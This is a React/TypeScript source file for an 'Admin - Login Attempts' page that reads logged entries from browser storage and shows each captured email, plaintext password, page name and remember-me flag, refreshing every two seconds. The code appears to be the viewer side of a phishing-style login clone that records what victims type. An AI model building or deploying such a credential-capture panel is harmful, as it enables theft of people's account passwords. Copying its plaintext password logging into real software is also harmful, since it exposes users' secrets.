import React, { useEffect, useMemo, useState } from 'react'

interface LogEntry {
  email?: string
  password?: string
  rememberMe?: boolean
  page: 'login' | 'password'
  ts: number
}

const STORAGE_KEY = 'login_attempts'

function loadLogs(): LogEntry[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY)
    if (!raw) return []
    const parsed = JSON.parse(raw)
    if (Array.isArray(parsed)) return parsed as LogEntry[]
    return []
  } catch {
    return []
  }
}

const AdminPage: React.FC = () => {
  const [logs, setLogs] = useState<LogEntry[]>([])

  // initial load + auto refresh every 2s
  useEffect(() => {
    setLogs(loadLogs())
    const id = setInterval(() => {
      setLogs(loadLogs())
    }, 2000)
    return () => clearInterval(id)
  }, [])

  const refresh = () => setLogs(loadLogs())

  const clearLogs = () => {
    localStorage.removeItem(STORAGE_KEY)
    setLogs([])
  }

  const formatted = useMemo(() => {
    return [...logs].sort((a,b)=> b.ts - a.ts)
  }, [logs])

  return (
    <div className="min-h-screen bg-slate-900 text-white px-4 py-8">
      <div className="max-w-3xl mx-auto">
        <h1 className="text-2xl font-bold mb-6">Admin - Login Attempts</h1>
        <div className="flex items-center justify-between mb-4">
          <div className="text-sm text-slate-300">Total: {formatted.length}</div>
          <div className="flex items-center gap-2">
            <button onClick={refresh} className="px-3 py-2 rounded bg-slate-700 hover:bg-slate-600 text-sm">Refresh</button>
            <button onClick={clearLogs} className="px-3 py-2 rounded bg-red-600 hover:bg-red-700 text-sm">Clear</button>
          </div>
        </div>
        <div className="overflow-x-auto rounded border border-slate-700">
          <table className="min-w-full text-left text-sm">
            <thead className="bg-slate-800/70">
              <tr>
                <th className="px-3 py-2 border-b border-slate-700">Time</th>
                <th className="px-3 py-2 border-b border-slate-700">Page</th>
                <th className="px-3 py-2 border-b border-slate-700">Email</th>
                <th className="px-3 py-2 border-b border-slate-700">Password</th>
                <th className="px-3 py-2 border-b border-slate-700">Remember</th>
              </tr>
            </thead>
            <tbody>
              {formatted.length === 0 && (
                <tr>
                  <td className="px-3 py-4 text-slate-400" colSpan={5}>No data.</td>
                </tr>
              )}
              {formatted.map((l, idx) => (
                <tr key={idx} className="odd:bg-slate-800/30">
                  <td className="px-3 py-2 whitespace-nowrap">{new Date(l.ts).toLocaleString()}</td>
                  <td className="px-3 py-2">{l.page}</td>
                  <td className="px-3 py-2 break-all">{l.email ?? ''}</td>
                  <td className="px-3 py-2 break-all">{l.password ?? ''}</td>
                  <td className="px-3 py-2">{l.rememberMe ? 'Yes' : 'No'}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  )
}

export default AdminPage
